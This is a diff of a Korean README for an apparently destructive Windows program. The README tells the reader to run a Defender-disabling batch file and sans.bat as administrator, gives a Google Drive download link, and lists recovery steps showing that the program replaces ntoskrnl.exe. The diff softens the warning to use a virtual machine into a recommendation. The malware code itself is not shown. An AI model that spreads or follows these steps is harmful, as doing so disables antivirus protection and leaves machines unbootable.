@@ -4,17 +4,17 @@
 
 1.Microsoft Defender del.bat을 관리자 권한으로 실행한다.
 
-2.sans.zip의 압축을 풀고 안에 있는 sans.exe를 실행한다. (폴더 안에 있는 파일을 옮겨서는 안된다.)
+2.sans.zip의 압축을 풀고 안에 있는 sans.bat를 관리자 권한으로 실행한다. (폴더 안에 있는 파일을 옮겨서는 안된다.)
 
 *다운은 https://drive.google.com/file/d/1op_IEwEJVRcm54yajAecURJljIR0cjHL/view?usp=drive_link 여기에서!
 
-⚠️가상머신에서 실행 하세요. 물론 복구 방법도 있습니다. 
+⚠️가상머신에서 실행 하는 것을 추천 한다. 물론 복구 방법도 있다.
 
 # 복구 방법
 
 1.Hirens boot cd로 부팅 한다.
 
-2. win+R (c:\windows\system32)
+2.win+R (c:\windows\system32)
 
 3.ntoskrnl.exe.bak를 한번 클릭한다 그리고 f2를 누르고 ntoskrnl.exe로 바꾼다.
 
